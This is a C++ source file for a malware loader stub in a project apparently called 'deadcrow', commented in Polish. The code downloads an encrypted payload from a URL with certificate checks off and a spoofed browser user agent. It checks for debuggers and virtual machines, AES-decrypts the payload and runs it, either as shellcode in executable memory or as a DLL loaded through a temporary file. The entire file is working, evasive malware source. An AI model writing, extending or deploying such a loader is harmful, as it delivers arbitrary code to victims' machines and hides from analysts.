#include "stub.h"
#include "../utils/anti_debug.h"
#include "../utils/aes.h"
#include <iostream>
#include <fstream>
#include <curl/curl.h>
#include <memory>
#include <stdexcept>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

namespace deadcrow {
namespace loader {

// Callback dla libcurl do zapisywania danych
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    std::vector<uint8_t>* mem = static_cast<std::vector<uint8_t>*>(userp);
    
    size_t prev_size = mem->size();
    mem->resize(prev_size + realsize);
    std::memcpy(mem->data() + prev_size, contents, realsize);
    
    return realsize;
}

Stub::Stub() {
    // Inicjalizacja libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[LOADER] " << status << std::endl;
        #endif
    };
}

bool Stub::fetchPayloadFromUrl(const std::string& url) {
    reportStatus("Pobieranie payloadu z URL: " + url);
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (utils::AntiDebug::performAllChecks()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Użyj libcurl do pobrania payloadu
    CURL* curl = curl_easy_init();
    if (!curl) {
        reportStatus("Nie udało się zainicjalizować libcurl");
        return false;
    }
    
    // Przygotuj bufor na dane
    encrypted_payload_.clear();
    
    // Konfiguracja żądania
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &encrypted_payload_);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Wyłącz weryfikację SSL (w produkcji lepiej włączyć)
    
    // Wykonaj żądanie
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        reportStatus("Błąd podczas pobierania payloadu: " + std::string(curl_easy_strerror(res)));
        return false;
    }
    
    reportStatus("Pobrano payload: " + std::to_string(encrypted_payload_.size()) + " bajtów");
    return true;
}

bool Stub::loadPayloadFromMemory(const std::vector<uint8_t>& encrypted_payload, const std::string& key) {
    reportStatus("Ładowanie payloadu z pamięci");
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (utils::AntiDebug::performAllChecks()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    encrypted_payload_ = encrypted_payload;
    
    // Deszyfruj payload
    if (!decryptPayload(key)) {
        reportStatus("Nie udało się odszyfrować payloadu");
        return false;
    }
    
    return true;
}

bool Stub::decryptPayload(const std::string& key) {
    try {
        reportStatus("Deszyfrowanie payloadu");
        
        // Utwórz obiekt AES z kluczem
        utils::AES aes(key);
        
        // Deszyfruj payload
        payload_ = aes.decrypt(encrypted_payload_);
        
        reportStatus("Payload odszyfrowany: " + std::to_string(payload_.size()) + " bajtów");
        return true;
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas deszyfrowania: " + std::string(e.what()));
        return false;
    }
}

bool Stub::verifyPayloadIntegrity() {
    // Tutaj można dodać weryfikację sumy kontrolnej lub podpisu cyfrowego
    // W prostej wersji sprawdzamy tylko, czy payload nie jest pusty
    if (payload_.empty()) {
        reportStatus("Payload jest pusty");
        return false;
    }
    
    // Sprawdź typ payloadu
    PayloadType type = detectPayloadType();
    if (type == PayloadType::UNKNOWN) {
        reportStatus("Nieznany typ payloadu");
        return false;
    }
    
    return true;
}

Stub::PayloadType Stub::detectPayloadType() {
    // Sprawdź nagłówek pliku, aby określić typ payloadu
    if (payload_.size() < 4) {
        return PayloadType::UNKNOWN;
    }
    
    // Sprawdź, czy to plik PE (EXE/DLL)
    if (payload_[0] == 'M' && payload_[1] == 'Z') {
        // Sprawdź offset do nagłówka PE
        uint32_t pe_offset = *reinterpret_cast<uint32_t*>(&payload_[0x3C]);
        
        // Sprawdź, czy offset jest w zakresie
        if (pe_offset + 24 < payload_.size()) {
            // Sprawdź sygnaturę PE
            if (payload_[pe_offset] == 'P' && payload_[pe_offset + 1] == 'E' && 
                payload_[pe_offset + 2] == 0 && payload_[pe_offset + 3] == 0) {
                
                // Sprawdź, czy to DLL czy EXE
                uint16_t characteristics = *reinterpret_cast<uint16_t*>(&payload_[pe_offset + 22]);
                if (characteristics & 0x2000) {
                    reportStatus("Wykryto typ payloadu: DLL");
                    return PayloadType::DLL;
                } else {
                    reportStatus("Wykryto typ payloadu: EXE");
                    return PayloadType::EXE;
                }
            }
        }
    }
    
    // Jeśli nie wykryto konkretnego formatu, zakładamy, że to shellcode
    reportStatus("Wykryto typ payloadu: Shellcode");
    return PayloadType::SHELLCODE;
}

bool Stub::executePayload() {
    reportStatus("Wykonywanie payloadu");
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (utils::AntiDebug::performAllChecks()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Sprawdź integralność payloadu
    if (!verifyPayloadIntegrity()) {
        reportStatus("Weryfikacja integralności payloadu nie powiodła się");
        return false;
    }
    
    // Wykonaj payload w zależności od typu
    PayloadType type = detectPayloadType();
    switch (type) {
        case PayloadType::SHELLCODE:
            return executeShellcode(payload_);
        case PayloadType::DLL:
            return executeDll(payload_);
        case PayloadType::EXE:
            reportStatus("Wykonywanie plików EXE nie jest jeszcze zaimplementowane");
            return false;
        default:
            reportStatus("Nieznany typ payloadu");
            return false;
    }
}

bool Stub::executeShellcode(const std::vector<uint8_t>& shellcode) {
    reportStatus("Wykonywanie shellcode'u");
    
#ifdef _WIN32
    // Alokuj pamięć z uprawnieniami do wykonania
    void* exec_mem = VirtualAlloc(NULL, shellcode.size(), 
                                 MEM_COMMIT | MEM_RESERVE, 
                                 PAGE_EXECUTE_READWRITE);
    
    if (!exec_mem) {
        reportStatus("Nie udało się zaalokować pamięci dla shellcode'u");
        return false;
    }
    
    // Skopiuj shellcode do zaalokowanej pamięci
    memcpy(exec_mem, shellcode.data(), shellcode.size());
    
    // Wykonaj shellcode
    DWORD old_protect;
    VirtualProtect(exec_mem, shellcode.size(), PAGE_EXECUTE, &old_protect);
    
    // Utwórz wskaźnik do funkcji i wywołaj shellcode
    using ShellcodeFunc = void (*)();
    ShellcodeFunc func = reinterpret_cast<ShellcodeFunc>(exec_mem);
    
    // Wykonaj w osobnym wątku, aby nie blokować głównego wątku
    HANDLE thread = CreateThread(NULL, 0, 
                               reinterpret_cast<LPTHREAD_START_ROUTINE>(func), 
                               NULL, 0, NULL);
    
    if (!thread) {
        reportStatus("Nie udało się utworzyć wątku dla shellcode'u");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return false;
    }
    
    // Czekaj na zakończenie wątku
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    
    // Zwolnij pamięć
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
#else
    // Alokuj pamięć z uprawnieniami do wykonania
    void* exec_mem = mmap(NULL, shellcode.size(), 
                         PROT_READ | PROT_WRITE | PROT_EXEC, 
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (exec_mem == MAP_FAILED) {
        reportStatus("Nie udało się zaalokować pamięci dla shellcode'u");
        return false;
    }
    
    // Skopiuj shellcode do zaalokowanej pamięci
    memcpy(exec_mem, shellcode.data(), shellcode.size());
    
    // Wykonaj shellcode
    using ShellcodeFunc = void (*)();
    ShellcodeFunc func = reinterpret_cast<ShellcodeFunc>(exec_mem);
    func();
    
    // Zwolnij pamięć
    munmap(exec_mem, shellcode.size());
#endif
    
    reportStatus("Shellcode wykonany pomyślnie");
    return true;
}

bool Stub::executeDll(const std::vector<uint8_t>& dll_data) {
    reportStatus("Wykonywanie DLL w pamięci");
    
#ifdef _WIN32
    // Implementacja refleksyjnego ładowania DLL
    // To jest uproszczona wersja, pełna implementacja wymaga więcej kodu
    
    // Zapisz DLL do pliku tymczasowego (w pełnej implementacji należy unikać zapisu na dysk)
    std::string temp_path = std::tmpnam(nullptr);
    std::ofstream temp_file(temp_path, std::ios::binary);
    if (!temp_file) {
        reportStatus("Nie udało się utworzyć pliku tymczasowego");
        return false;
    }
    
    temp_file.write(reinterpret_cast<const char*>(dll_data.data()), dll_data.size());
    temp_file.close();
    
    // Załaduj DLL
    HMODULE dll_handle = LoadLibraryA(temp_path.c_str());
    if (!dll_handle) {
        reportStatus("Nie udało się załadować DLL");
        std::remove(temp_path.c_str());
        return false;
    }
    
    // Znajdź i wywołaj funkcję DllMain
    using DllMainFunc = BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID);
    DllMainFunc dll_main = reinterpret_cast<DllMainFunc>(GetProcAddress(dll_handle, "DllMain"));
    
    if (dll_main) {
        dll_main(dll_handle, DLL_PROCESS_ATTACH, NULL);
    }
    
    // Usuń plik tymczasowy
    std::remove(temp_path.c_str());
    
#else
    // W Linuksie ładowanie bibliotek dynamicznych w pamięci jest bardziej skomplikowane
    // i wymaga użycia dlopen/dlsym
    reportStatus("Wykonywanie DLL w pamięci nie jest zaimplementowane dla Linuksa");
    return false;
#endif
    
    reportStatus("DLL wykonane pomyślnie");
    return true;
}

void Stub::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Stub::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

} // namespace loader
} // namespace deadcrow
